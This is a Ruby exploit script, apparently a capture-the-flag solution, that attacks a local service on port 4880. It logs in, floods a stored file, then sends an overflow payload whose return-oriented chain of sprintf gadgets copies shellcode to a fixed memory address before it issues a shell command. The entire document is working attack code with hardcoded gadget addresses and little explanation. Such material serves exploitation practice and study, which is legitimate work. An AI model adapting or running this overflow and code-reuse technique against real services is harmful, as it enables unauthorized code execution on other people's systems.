require 'socket'
require 'securerandom'

class Exploit 
	def initialize
		@s = TCPSocket.new('localhost', 4880)

		Thread.new do
			loop { print @s.read(1) }
			
		end
	end
	
	def read_banner
		3.times { puts @s.readline }
	end	

	def read_command cmd_count
		(4+cmd_count).times { puts @s.readline }
		puts @s.read(2)	
	end

	def login
		@s.write("login iuwuninsu\n")
		puts @s.read("password: ".length)
		@s.write("iuwuninsu\n")
		1.times { puts @s.readline }
	end

	def write data
		@s.write("write attack\n")
		@s.write(data + "<<<\n")
	end

	def read
		@s.write("read attack\n")
	end

	def send_yes
		sleep(0.1)
		@s.write("y\n")
	end

	def close_write
		@s.close_write
		#@s.write("")
	end

	def send_command
		@s.write("ls\n")
	end

end
e = Exploit.new
e.login
e.write "a" * 200
e.read
e.send_yes
e.read
readline
sleep(1)

e2 = Exploit.new
e2.login
sleep(0.1)


login = 0x08049A48
ret = 0x08048FA2 
#strcpy = 0x08048700
sprintf = 0x080487E0
ppr = 0x080491BB 
dest = 0x0804C428 
shellcode = [0x8048810,0x8048daf,0x8048f52,0x804861f,0x8048614,0x8048ec6,0x8048614,0x8049964,0x804861a,0x8048813,0x8048814,0x80490c8,0x8048832,0x8049f54,0x80488c0,0x80493f0,0x8048dbd,0x80490c8,0x804984a,0x8049f54,0x80488c0,0x80497da,0x8048903,0x8048d60,0x80487c2,0x8049141,0x804885b,0x804861a,0x8048eba,0x80487c2,0x804861a,0x804861b,0x804c0d5,0x8048792,0x8048813,0x8048814,0x80490c8,0x8048832,0x8048762,0x8048825,0x8048614,0x8049639,0x80489a3,0x8048813,0x8048814,0x8049f54,0x80488c0,0x804881a,0x80487c2,0x80493da,0x80493da,0x0804905E,0x80487c2,0x80487c2,0x80493da,0x8049856,0x8048971,0x80497b2,0x8048813,0x804861f,0x804881a,0x8048614,0x8048813,0x8048814,0x80490c8,0x8048c6e,0x8049f54,0x80488c0]

payload = [login-0x38].pack('<I') * 69 + [0x80808080].pack('<I') 
payload += [ret].pack('<I') * 50

shellcode.each do |byte|
	payload += [sprintf, ppr, dest, byte].pack('<I*')
	dest += 1
end

payload += [dest- shellcode.length].pack('<I*') # return address
=begin
libc_start_main = 0x08048752
payload = [libc_start_main-0x38].pack('<I') * 69 + [0x80808080].pack('<I')
payload += [0x41414141].pack('<I') * 100

print "[*] payload length : %d" % payload.length
=end
payload = payload.ljust(4090)

e2.write payload

STDIN.readline
e.close_write
e.send_command
sleep(10)
